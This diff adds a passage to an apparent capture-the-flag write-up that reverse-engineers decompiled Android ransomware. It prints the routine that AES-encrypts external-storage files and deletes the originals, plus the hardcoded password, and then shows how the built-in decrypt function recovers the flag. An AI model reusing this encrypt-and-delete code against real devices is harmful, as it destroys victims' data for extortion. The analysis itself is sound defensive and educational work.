@@ -77,3 +77,90 @@ class C01165 implements Runnable {
     }
 }
 ```
+A new object is initiated (FilesEncryptor) with the current context and the **encrypt** function is call.<br>
+This is the **encrypt** function in the FilesEncryptor class:
+```java
+public void encrypt() throws Exception {
+    if (!this.settings.getBoolean(Constants.FILES_WAS_ENCRYPTED, false) && isExternalStorageWritable()) {
+        AesCrypt aes = new AesCrypt(Constants.CIPHER_PASSWORD);
+        Iterator it = this.filesToEncrypt.iterator();
+        while (it.hasNext()) {
+            String fileName = (String) it.next();
+            aes.encrypt(fileName, new StringBuilder(String.valueOf(fileName)).append(".enc").toString());
+            new File(fileName).delete();
+        }
+        Utils.putBooleanValue(this.settings, Constants.FILES_WAS_ENCRYPTED, true);
+    }
+}
+```
+It's pretty easy to understand what's up.<br>
+First, the function checks if the files are already encrypted (in order to not encrypt it twice) and if it's possible to change the data in the external storage.<br>
+Then, an AES encryption instance is created (**AesCrypt**) with a key that presents in the **Constants** class.<br>
+Afterward, it will iterate the files in the external storage and call the _encrypt_ function of the initiated **AesCrypt** object, and will delete the original file.<br>
+Lastly, it will sets a boolean variable to ```true```, so the files won't get encrypted twice.<br><br>
+
+According to the **Constants** class:
+```java
+...snip...
+public static final String CIPHER_PASSWORD = "mcsTnTld1dDn";
+...snip...
+```
+So the key is now known, let's see what's up at the **AesCrypt** class:
+```java
+...snip...
+public AesCrypt(String password) throws Exception {
+    MessageDigest digest = MessageDigest.getInstance("SHA-256");
+    digest.update(password.getBytes(HTTP.UTF_8));
+    byte[] keyBytes = new byte[32];
+    System.arraycopy(digest.digest(), 0, keyBytes, 0, keyBytes.length);
+    this.key = new SecretKeySpec(keyBytes, "AES");
+    this.spec = getIV();
+}
+
+public AlgorithmParameterSpec getIV() {
+    return new IvParameterSpec(new byte[16]);
+}
+    
+public void encrypt(String rawFile, String encryptedFile) throws Exception {
+    FileInputStream fis = new FileInputStream(rawFile);
+    FileOutputStream fos = new FileOutputStream(encryptedFile);
+    this.cipher.init(1, this.key, this.spec);
+    CipherOutputStream cos = new CipherOutputStream(fos, this.cipher);
+    byte[] d = new byte[8];
+    while (true) {
+        int b = fis.read(d);
+        if (b == -1) {
+            cos.flush();
+            cos.close();
+            fis.close();
+            return;
+        }
+        cos.write(d, 0, b);
+    }
+}
+
+public void decrypt(String encryptedFile, String rawFile) throws Exception {
+    FileInputStream fis = new FileInputStream(encryptedFile);
+    FileOutputStream fos = new FileOutputStream(rawFile);
+    this.cipher.init(2, this.key, this.spec);
+    CipherInputStream cis = new CipherInputStream(fis, this.cipher);
+    byte[] d = new byte[8];
+    while (true) {
+        int b = cis.read(d);
+        if (b == -1) {
+            fos.flush();
+            fos.close();
+            cis.close();
+            return;
+        }
+        fos.write(d, 0, b);
+    }
+}
+```
+Let's break it down a bit.<br>
+First, in the constructor of the class a IV (which is an 16 zeros according to **getIV**) and akey generated from the given password (which we know already). The password seems to be a SHA-256 of the "mcsTnTld1dDn" - which is **d49af309a4c69382ff07bc6f83ba4c2595a7f086d3e5b69e119e2337cb75172d**.<br><br>
+
+After we got the key and IV, we can decrypt the file. Fortunately, the **decrypt** function exists.<br>
+So after copying the class to a new Java project, creating an instance (with "mcsTnTld1dDn") and running the **decrypt** function, it seems like an image was created.
+
+In the end, the flag is **BullShitR4ns0mW4re**
